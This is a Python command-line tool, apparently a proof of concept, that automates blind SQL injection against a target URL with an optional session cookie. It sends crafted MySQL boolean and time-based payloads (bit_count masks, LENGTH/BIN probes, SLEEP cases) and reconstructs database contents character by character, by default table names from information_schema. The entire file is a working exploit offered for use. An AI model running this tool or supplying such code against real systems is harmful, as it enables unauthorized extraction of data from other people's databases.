#!/usr/bin/env python3
#
#
# [ 08-28-2020 ]
#
# duality.py
#
# Proof of concept of a method which attemps to perform as less requests as possible to
# exploit blind sql injections
#

import sys
import string
import requests
import hashlib
import time
import argparse
import threading
import curses

binstr = '00000000'
request = 0
hashes = []


def inject(injection):
    global use_hashes, hashes, true_string, cookie, cookies, request



    url = target + str(injection)
    url = url.replace('+', '%2b')
    #url = url.replace(' ', '+')
    r = requests.get(url, cookies=cookies)
    data = r.text
    
    request += 1
 
 
    if use_hashes:
        if len(hashes) == 2:
            return True if hashes[1] in hashlib.md5(data.encode('utf-8')).hexdigest() else False
        else:
            return hashlib.md5(data.encode('utf-8')).hexdigest() 
    else:
        return True if bytes(true_string, 'utf-8') in data.encode('utf-8') else False

  
def get_hashes():

    sys.stdout.write("[+] Generating hashes\n")
    global hashes, tid

    null = inject('0')
    hashes.append(null)
    if not tid:
        i = 1
        while 1:
            guess = inject(i)
            i += 1
            if guess != null:
                hashes.append(guess)
                tid = i
                break
    else:
        hashes.append(inject(tid))


    sys.stdout.write("\t[-] Hash #0: %s\n" % ( hashes[0]))
    sys.stdout.write("\t[-] Hash #1: %s\n" % ( hashes[1]))



def get_length():

    
    index = 1
    j = 1

    binlen = '00000000'

    size_limit = 0x00
    sizes = [0xff, 0xffff, 0xffffff, 0xffffffff, 0xffffffffffffffff ]
    c = 0
    global use_hashes, true_string, tid, column, table, row

    while 1:
        #print("%d: " % (sizes[c]))
        inj_length = "%s AND(SELECT LENGTH(%s)FROM %s LIMIT/*LESS*/ %d,1)>%d" % (tid, column, table, row, sizes[c])
        res_length = inject(inj_length)
        c += 1
    
        if not res_length:
            break

    limit = len(bin(sizes[c - 1]).replace('0b', ''))

    sys.stdout.write("\n\n[+] Calculating length: ")
    sys.stdout.flush()

    for i in range(1, limit + 1 ):


        injection = "%s AND(SELECT MID(LPAD(BIN(length(%s)),%d,'0'),%d,1)FROM %s LIMIT/*LESS*/ %d,1)" % (tid, column, limit, i, table, row)
        #print("%s\n" % (injection))
        result = inject(injection)

        if result:
            bit = '1' 
        else:
            bit = '0'


        sys.stdout.write("%s" % (bit))
        sys.stdout.flush()
        binlen = binlen[:i-1] + bit + binlen[i+1:]

    binlen = int(binlen, 2)
    sys.stdout.write('\n[+] Length found: %d\n' % (binlen))
    return binlen


def autodetect_charset():


    classes = { 'num' : '[[:digit:]]',
                'alpha' : '[[:alpha:]]',
                'alnum' : '[[:alnum:]]',
                'hex' : '[[:xdigit:]]'
            }


def get_bit_count(charindex):

    if onumbers or ohex:
        if time_based:
            injection = "%s and(select case when (@a:=(select bin(bit_count(ascii(mid(%s, %d, 1))%%2615))from %s limit %d,1))='1' then 1 when @a='10' then 0 when @a='11' then (1 and not sleep(1)) else (0 and not sleep(1) ) end );"
            injection = injection % (tid, column, charindex, table, row)
            #sys.stdout.write("%s\n" % injection)
            timer1 = time.perf_counter()
            lenbit = inject(injection)
            timer2 = time.perf_counter()

            if timer2 - timer1 < 1:
            #sys.stdout.write("%d : %s\n" %(timer2-timer1, lenbit))
                return 1 if lenbit else 2
            else:
            #sys.stdout.write("%d : %s\n" %(timer2-timer1, lenbit))
                return 3 if lenbit else 0

        else:
            
            injection = "%s and(select bit_count(ascii(mid(%s,%d,1))%%2615)%%261 from %s limit %d,1);"
            injection = injection % (tid, column, charindex, table, row)
            repbit = inject(injection)

            # find out if number of bits in *bitcount is 2 or 1
            # plain: select  bit_count(ascii(mid('0',1,1))&15=2  from usuarios limit 0,1;
            injection = "%s and(select bit_count(ascii(mid(%s,%d,1))%%2615)>1 from %s limit %d,1);"
            injection = injection % (tid, column, charindex, table, row)
            lenbit = inject(injection)

            if lenbit:
                return 3 if repbit else 2
            else:
                return 1 if repbit else 0
        
    if oalpha or oalphanum:

        injection = "%s and(select (bit_count(ascii(mid(%s,%d,1))%%2615)+1)%%261 from %s limit %d,1);"
        injection = injection % (tid, column, charindex, table, row)
        repbit = inject(injection)

        injection = "%s and(select bit_count(ascii(mid(%s,%d,1))%%2615)+1>3 from %s limit %d,1);"
        injection = injection % (tid, column, charindex, table, row)
        lenbit = inject(injection)

        if lenbit:
            return 4 if repbit else 3
        else:
            if not repbit:
                return 1
            else:
                injection = "%s and(select bit_count(ascii(mid(%s,%d,1))%%2615) from %s limit %d,1);"
                injection = injection % (tid, column, charindex, table, row)
                bit = inject(injection)
                return 2 if bit else 0

    if oascii:

        if time_based:
            injection = "%s and(select case when (@a:=(select bit_count(ascii(mid(%s,%d,1))%%2663)%%267 from %s limit %d,1))=3 then 1 when @a=2 then 0 when @a=4 then 0 or sleep(0.5) when @a=5 then 1 and not sleep(0.5) when @a=1 then 1 and not sleep(1) when @a=0 then 0 or not sleep(1) end)"
            injection = injection % (tid, column, charindex, table, row)
            #sys.stdout.write("\n%s\n" % injection)
            timer1 = time.perf_counter()
            lenbit = inject(injection)
            timer2 = time.perf_counter()
            interval = timer2 - timer1

            if interval < 0.5:
                return 3 if lenbit else 2
            else:
                if interval < 1:
                    return 5 if lenbit else 4
                else:
                #sys.stdout.write("c: %s\n")
                    return 1 if lenbit else 0



        injection = "%s and(select (bit_count(ascii(mid(%s,%d,1))%%2663))%%261 from %s limit %d,1);"
        injection = injection % (tid, column, charindex, table, row)
        repbit = inject(injection)

        injection = "%s and(select bit_count(ascii(mid(%s,%d,1))%%2663)>3 from %s limit %d,1);"
        injection = injection % (tid, column, charindex, table, row)
        lenbit = inject(injection)

        if lenbit:
            if repbit:
                return 5
            else:
                return 4
        else:
                injection = "%s and(select bit_count(ascii(mid(%s,%d,1))%%2663)>1 from %s limit %d,1);"
                injection = injection % (tid, column, charindex, table, row)
                lenbit = inject(injection)
                if lenbit:
                    return 3 if repbit else 2
                else:
                    return 1 if repbit else 0


def inject_m(op, charindex):
    if op == r0g or op == r0hg or op == r0lg:
        mask = '63'
    elif op == r7:
        mask = '64'
    else:
        mask = '15'
    binjection = "%s and(select(ascii(mid(%s,%d,1))%%26%s)%s from %s limit %d,1)"
    injection = binjection % (tid, column, charindex, mask, op, table, row)
    return inject(injection)





def numbers(charindex, bit_count):
    global r, r1g  , r1hg , r1lg, r2g, r2hg, r2lg

    binjection = "%s and(select(ascii(mid(%s,%d,1))%%2615)%s from %s limit %d,1)"

    if bit_count == 2:

        op = r1hg
        injection = binjection % (tid, column, charindex, op, table, row)
        hbit = inject(injection)

        op = r1lg
        injection = binjection % (tid, column, charindex, op, table, row)
        bit = inject(injection)

        if hbit:
            char = '9' if not bit else ','
        else:
            if bit:
                op = r2lg
                injection = binjection % (tid, column, charindex, op, table, row)
                bit = inject(injection)

                char = '5' if bit else '6'

            else:
                char = '3'
    
    elif bit_count == 1:

        op = r1g
        injection = binjection % (tid, column, charindex, op, table, row)
        bit = inject(injection)

        if bit:

            op = r1hg
            injection = binjection % (tid, column, charindex, op, table, row)
            bit = inject(injection)

            char  = '8' if bit else '4'

        else:

            op = r2lg
            injection = binjection % (tid, column, charindex, op, table, row)
            bit = inject(injection)

            char = '1' if bit else '2'


    elif bit_count == 3:
        op = r2lg
        injection = binjection % (tid, column, charindex, op, table, row)
        bit = inject(injection)

        if bit:
            op = r1hg
            injection = binjection % (tid, column, charindex, op, table, row)
            bit = inject(injection)

            char = '7' if not bit else '-'
        else:
            char = '.'
    
    elif bit_count == 0:
        char = '0'

    return char



    
def h3x(charindex, bit_count):
    global r0lg, r1g  , r1hg , r1lg, r2g, r2hg, r2lg
    char = ''


    if bit_count == 1:

        op = r0lg
        bit = inject_m(op, charindex)

        op = r2hg
        bitc = inject_m(op, charindex)
        
        if bit:
            op = r1hg
            bit = inject_m(op, charindex)
            if not bit:
                op = r1lg
                bit = inject_m(op, charindex)
                if not bit:
                    char = '1' if not bitc else '2'
                else:
                    char = '4'

            else:
                char = '8'
        else:
            op = r1lg
            bit = inject_m(op, charindex)
            if not bit:
                char = 'a' if not bitc else 'b'
            else:
                char = 'd'
            
             

    elif bit_count == 2:

        op = r1lg
        bit = inject_m(op, charindex)

        op = r0lg
        bitc = inject_m(op, charindex)

        if bit:
            op = r2hg
            bit = inject_m(op, charindex)
            if bit:
                char = '6' if bitc else 'f'
            else:
                char = '5' if bitc else 'e'
        else:
            op = r1hg
            bit = inject_m(op, charindex)
            if not bit:
                char = '3' if bitc else 'c'
            else:
                char = '9'


    elif bit_count == 3:
        char = '7'
    
    elif bit_count == 0:
        char = '0'
    
    return char
    
def alpha(charindex, bit_count):
    global r1g, r1hg, r1lg, r2g, r2hg, r2lg, case_insensitive
    char = ''

    op = r0lg
    bitc = inject_m(op, charindex)
    
    if bit_count == 2:

        op = r2lg
        bit = inject_m(op, charindex)

        if bit:
            op = r2hg
            bit = inject_m(op, charindex)

            if bit:
                char = 's' if bitc else 'c'
            else:
                op = r1hg
                bit = inject_m(op, charindex)

                if not bit:
                    char = 'e' if not bitc else 'u'
                else:
                    char = 'i' if not bitc else 'y'
        else:
            op = r1hg
            bit = inject_m(op, charindex)

            if not bit:
                char = 'f' if not bitc else 'v'
            else:
                op = r2hg
                bit = inject_m(op, charindex)
                if bit:
                    char = 'z' if bitc else 'j'
                else:
                    char = 'l' if inject_m(r7, charindex) else ','


    elif bit_count == 1:
        op = r1hg
        bit = inject_m(op, charindex)

        if not bit:
            op = r1lg
            bit = inject_m(op, charindex)

            if bit:
                char = 't' if bitc else 'd'
            else:
                op = r2lg
                bit = inject_m(op, charindex)

                if bit:
                    char = 'a' if not bitc else 'q'
                else:
                    char = 'r' if bitc else 'b'
        else:
            char = 'h' if not bitc else 'x'



    elif bit_count == 3:

        op = r1hg
        bit = inject_m(op, charindex)

        if bit:
            op = r2hg
            bit = inject_m(op, charindex)

            if not bit:
                char = 'm'
            else:
                op = r2lg
                bit = inject_m(op, charindex)
                if bit:
                    char = 'k'
                else:
                    char = 'n' if inject_m(r7, charindex) else '.'
        else:
            char = 'g' if not bitc else 'w'

    elif bit_count == 4:
        char ='o' if not bitc else '_'


    elif bit_count == 0:
        char = ' ' if not bitc else 'p'
 
    
    if not case_insensitive:
        op = r0hg
        bit = inject_m(op, charindex)
        if not bit and char != '.' and char != '_' and char != ',':
            char = char.upper()
           
    return char

def alphanum(charindex, bit_count):
    global r1g, r1hg, r1lg, r2g, r2hg, r2lg, r7, case_insensitive
    char = ''


    op = r7
    bitn = inject_m(op, charindex)
    
    if bitn:
        op = r0lg
        bitc = inject_m(op, charindex)

    
    if bit_count == 2:

        op = r2lg
        bit = inject_m(op, charindex)

        if bit:
            op = r2hg
            bit = inject_m(op, charindex)

            if bit:
                if bitn:
                    char = 's' if bitc else 'c'
                else:
                    char = '3'
            else:
                op = r1hg
                bit = inject_m(op, charindex)

                if not bit:
                    if bitn:
                        char = 'e' if not bitc else 'u'
                    else:
                        char = '5'
                else:
                    if bitn:
                        char = 'i' if not bitc else 'y'
                    else:
                        char = '9'
        else:
            op = r1hg
            bit = inject_m(op, charindex)

            if not bit:
                if bitn:
                    char = 'f' if not bitc else 'v'
                else:
                    char = '6'
            else:
                op = r2hg
                bit = inject_m(op, charindex)
                if bit:
                    char = 'z' if bitc else 'j'
                else:
                    char = 'l' if inject_m(r7, charindex) else ',' 


    elif bit_count == 1:
        op = r1hg
        bit = inject_m(op, charindex)


        if not bit:
            op = r1lg
            bit = inject_m(op, charindex)

            if bit:
                if bitn:
                    char = 't' if bitc else 'd'
                else:
                    char = '4'
            else:
                op = r2lg
                bit = inject_m(op, charindex)

                if bit:
                    if bitn:
                        char = 'a' if not bitc else 'q'
                    else:
                        char = '1'
                else:
                    if bitn:
                        char = 'r' if bitc else 'b'
                    else:
                        char = '2'
        else:
            if bitn:
                char = 'h' if not bitc else 'x'
            else:
                char = '8'



    elif bit_count == 3:

        op = r1hg
        bit = inject_m(op, charindex)


        if bit:
            op = r2hg
            bit = inject_m(op, charindex)

            if not bit:
                char = 'm'
            else:
                op = r2lg
                bit = inject_m(op, charindex)
                if not bit:
                    char = 'n' if inject_m(r7, charindex) else '.' 
                else:
                    char = 'k'
        else:
            if bitn:
                char = 'g' if not inject_m(r0lg, charindex) else 'w'
            else:
                char = '7'

    elif bit_count == 4:
        char ='o' if not inject_m(r0lg, charindex) else '_'


    elif bit_count == 0:
        if not bitn:
            char = ' ' if not inject_m(r0lg, charindex) else '0'
        else:
            char = 'p'


    op = r0hg
    bit = inject_m(op, charindex)
    if not bit and char != '.' and char != '_' and char != ',':
        char = char.upper()
    return char





def full_ascii(charindex, bit_count):
    global r0g, r0lg, r0hg, r1g, r1hg, r1lg, r2g, r2hg, r2lg, r12g, r7


    def inject_i(op, charindex):

        #invert = '~' if bit_count == 0x04 else ''    
        if bit_count == 4:
            invert = '~'
        else:
            invert = ''

        binjection = 'if((@a:=(select(((%sascii(mid(%s,%d,1)))%s)from %s limit %d,1))=3||@a=0,0,1)'
        return inject(binjection % (invert, column, charindex, op, table, row))

    def inject_o(op, charindex):
        
        #invert = '~' if bit_count == 0x04 else ''    
        if bit_count == 4:
            invert = '~'
        else:
            invert = ''
        binjection = "%s and(select(((%sascii(mid(%s,%d,1)))%s)from %s limit %d,1)"
        injection = binjection % (tid, invert, column, charindex,  op, table, row)
        return inject(injection)
    global case_insensitive
    char = ''

    def inject_a(op, charindex, comp):
        binjection = "%s and(select(bit_count(((ascii(mid(%s,%d,1))%%2663)%s))from %s limit %d, 1)=%d"
        injection = binjection % (tid, column, charindex, op, table, row, comp)
        return inject(injection)
    
    if bit_count == 3:

        
        if inject_i(r2g, charindex):
            
            if inject_o(r2hg, charindex):
                char2 = '10'
            else:
                char2 = '01'

            if inject_i(r0g, charindex):

                if inject_o(r1lg, charindex):
                    char1 = '01'
                else:
                    char1 = '10'
                    
                if inject_o(r0lg, charindex):
                    char = '01' + char1 + char2
                else:
                    char = '10' + char1 + char2

            else:
                if inject_o(r0g, charindex):
                    char = '1100' + char2
                else:
                    char = '0011' + char2

                bitl = inject_o(r0g, charindex)
        
        else:

            if inject_i(r0g, charindex):
                if inject_o(r0lg, charindex):
                    char = '01'
                else:
                    char = '10'
                if inject_o(r1lg, charindex):
                    char += '1100'
                else:
                    char += '0011'
            else:

                if inject_o(r0lg, charindex):
                    char = '11'
                    
                    if inject_o(r1lg, charindex):
                        char += '0100'
                    else:
                        char += '1000'
                        
                else:
                    char = '00'

                    if inject_o(r1lg, charindex):
                        char += '0111'
                    else:
                        char += '1011'                    
                


    elif bit_count == 2 or bit_count == 4:


            
        if inject_i(r2g, charindex):
            
            if inject_o(r2hg, charindex):
                char2 = '10'
            else:
                char2 = '01'
    
    
            if inject_i(r0g, charindex):
                if inject_i(r0lg, charindex):
                    char = '0100'
                else:
                    char = '1000'
                char += char2            
            else:
                if inject_o(r1lg, charindex):
                    char = '0001'
                else:
                    char = '0010'
                    
                char += char2
                
        else:
            if inject_o(r2hg, charindex):
                char = '000011'
            else:
                
                
                
                if inject_i(r1g, charindex):                  
                    
                    if inject_o(r0lg, charindex):
                        if inject_o(r1lg, charindex):
                            char = '010100' 
                        else:
                            char = '011000'
                    else:
                        if inject_o(r1lg, charindex):
                            char = '100100' 
                        else:
                            char = '101000'
                    
                else:
                    if inject_o(r1lg, charindex):
                        char = '001100'
                    else:
                        char = '110000'



        if bit_count == 4:
            char = char.replace('0', 'r').replace('1', '0').replace('r', '1')



    elif bit_count == 5:
        

        if not inject_a(r12g, charindex, 4):
            if inject_a(r1g, charindex, 2):
                if inject_a(r2hg, charindex, 1):
                    char = '111110' 
                else:
                    char = '111101'
            else:
                if inject_a(r1hg, charindex, 1):
                    char = '111011' 
                else:
                    char = '110111'           
        else:
            if inject_a(r0hg, charindex, 1):
                char = '101111' 
            else:
                char = '011111' 

    elif bit_count == 0x01:

        if inject_a(r12g, charindex, 1):
            if inject_a(r1g, charindex, 1):
                if inject_a(r1hg, charindex, 2):
                    char = '001000' 
                else:
                    char = '000100'
            else:
                if inject_a(r2hg, charindex, 1):
                    char = '000010'
                else:
                    char = '000001'

        else:
            if inject_a(r0hg, charindex, 1):
                char = '100000'
            else:
                char = '010000'

    else: # 0
        char = '000000'


    injection = "%s and (((select(ascii(mid(%s,%d,1)))from %s limit %d,1)>>6)%%261)"
    injection = injection % (tid, column, charindex, table, row)        
    if inject(injection):
        char = '1' + char 
    else:
        '0' + char


    return chr(int(char, 2))




def pwn(charindex):
    global r, row, onumbers, ohex, oalpha, oalphanum, oascii

    bit_count = get_bit_count(charindex)
    
    if onumbers:
        r[charindex] = numbers(charindex, bit_count )
    elif ohex:
        r[charindex] = h3x(charindex, bit_count)
    elif oalpha:
        r[charindex] = alpha(charindex, bit_count)
    elif oalphanum:
        r[charindex] = alphanum(charindex, bit_count)
    elif oascii:
        r[charindex] = full_ascii(charindex, bit_count)
    elif outf8:
        r[charindex] = full_ascii(charindex, bit_count)


def start():

    global r, row, threads_n, number_of_rows, hashes
    get_hashes()
    request = 0

    while row < number_of_rows:
        length = get_length()
        split = int(length / threads_n )

        sys.stdout.write("")

        r = ['' for i in range(length + 1)]

        
        index = [split * i + 1 for i in range(threads_n)]
        
        while index[0] <= split:




            for i in range(threads_n):

                t = threading.Thread(target = pwn, args = (index[i], ))
                t.start()
                t.join()
                index[i] += 1


        for i in range(1, length % threads_n + 1):
            pwn( split * threads_n + i )

        row += 1

        sys.stdout.write("\n\n[!] Extracted data: %s\n" % ''.join(r))

    return 1


parser = argparse.ArgumentParser(description="we got no names man, no names, we are nameless.")
parser.add_argument('-i','--case_insensitive', action='store_true', 
        help = 'Case insensitive.')
parser.add_argument('-g','--string', default = '',
        help = 'Unique string found when result is true, omit to automatically use a signature')
parser.add_argument('-s', '--charset', default = 'full',
        help = 'Charset type: full, alnum, alpha, digit, hex (default: %(default)s)')
parser.add_argument('-c','--column',     default = "group_concat(table_name)",
        help = 'Column to extract from table (default: %(default)s)')
parser.add_argument('-t','--table',    default = "information_schema.tables",
        help = 'Table name from where to extract data (default: %(default)s)')
parser.add_argument('-r','--row', default = 0, type=int,
        help = 'Row number to begin extraction, default: 0')
parser.add_argument('-m', '--number_of_rows', default = 1, type=int,
        help = 'Number of rows to extract. (default: %(default)s)')
parser.add_argument('-d','--threads', default = 1, type=int,
        help = 'Number of threads, default: 1')
parser.add_argument('-q','--time_based', action='store_true', 
        help = 'Extract 2 bits with one request.')

parser.add_argument('-k', '--cookie', default = '', type=str,
        help = "Session cookie")
parser.add_argument('TARGET', help='The vulnerable URL. Example: http://vuln.com/page.php?id= ')
args = parser.parse_args()


tid = 1
column    = args.column
table    = args.table
row = args.row
number_of_rows = args.number_of_rows + row
target    = args.TARGET
threads_n = args.threads
r = []
case_insensitive = 1 if args.case_insensitive else 0
time_based = 1 if args.time_based else 0
use_hashes = 1
if args.string:
    true_string = args.string
    use_hashes = 0
charset = args.charset
onumbers = ohex = oalpha = oalphanum = oascii = 0


####
# Custom bitwise operations
####
r0g  = '>>4)%263'
r0lg = '>>4)%261'
r0hg = '>>5)%261'
r1g  = '>>2)%263'
r1hg = '>>3)%261'
r1lg = '>>2)%261'
r2g  = ')%263'
r2hg = '>>1)%261'
r2lg = ')%261'
r12g = ')%2615'
r7   = '>>6)%261'


if charset == 'hex':
    ohex = 1
    r0g  = '>>4'
    r0lg = '>>4%261'
    r0hg = '>>5'
    r1g  = '>>2'
    r1hg = '>>3'
    r1lg = '>>2%261'
    r2g  = '%263'
    r2hg = '>>1%261'
    r2lg = '%261'
    r12g = '%2615'
    r7   = '>>6%261'


elif charset == 'digit':
    onumbers = 1
elif charset == 'alpha':
    oalpha = 1
elif charset == 'alnum':
    oalphanum = 1
    r0g  = '>>4'
    r0lg = '>>4%261'
    r0hg = '>>5'
    r1g  = '>>2'
    r1hg = '>>3'
    r1lg = '>>2%261'
    r2g  = '%263'
    r2hg = '>>1%261'
    r2lg = '%261'
    r12g = '%2615'
    r7   = '>>6%261'

elif charset == 'full':
    oascii = 1
elif charset == 'utf8':
    outf8 = 1
else:
    sys.stdout.write("[x] Incorrect charset name.\n")

cookies = {}
cookie = args.cookie or ''

if cookie:
    cookie = cookie.split('=') or cookie
    if not len(cookie) % 2:
        for i in range(0, len(cookie), 2):
             cookies[cookie[i]] = cookie[i+1] 
    else:
        sys.stdout.write('[x] Invalid cookie.\n')
        exit()



timer =  time.strftime("%X")
start()



sys.stdout.write("\n\n[+] Start Time:\t%s " % timer)
sys.stdout.write("\n[+] End Time:\t%s  " % time.strftime("%X" ))
sys.stdout.write("\n[+] %d requests\n" % (request))
sys.stdout.write("\n[+] Done.\n")


